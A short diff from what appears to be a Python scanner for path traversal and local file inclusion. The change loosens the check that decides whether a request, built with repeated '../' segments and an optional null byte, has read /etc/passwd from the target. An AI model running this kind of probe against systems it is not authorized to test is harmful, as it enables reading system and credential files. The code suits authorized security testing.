@@ -582,7 +582,7 @@ def file_inclusion(u,nullbyte=False,rounds=10,logs=True,returning=False,mapping=
     if logs==True:
      print("[*]Trying: "+ u+l)
     r=requests.get(u+l,headers=hea,proxies=proxy,timeout=timeout, verify=False)
-    if ("root:x:0:0:root:/root:/bin/bash" in r.text):
+    if ("root:x:0:0:" in r.text):
      s=True
      x= {"Status":s,"../ added": i,"Nullbyte":nullbyte,'Link':r.url}
      if logs==True:
@@ -607,7 +607,7 @@ def file_inclusion(u,nullbyte=False,rounds=10,logs=True,returning=False,mapping=
     if logs==True:
      print("[*]Trying: "+u+l)
     r=requests.get(u+l,headers=hea,proxies=proxy,timeout=timeout, verify=False)
-    if ("root:x:0:0:root:/root:/bin/bash" in r.text):
+    if ("root:x:0:0:" in r.text):
      s=True
      x= {"Status":s,"Nullbyte":nullbyte,'Link':r.url}
      if logs==True:
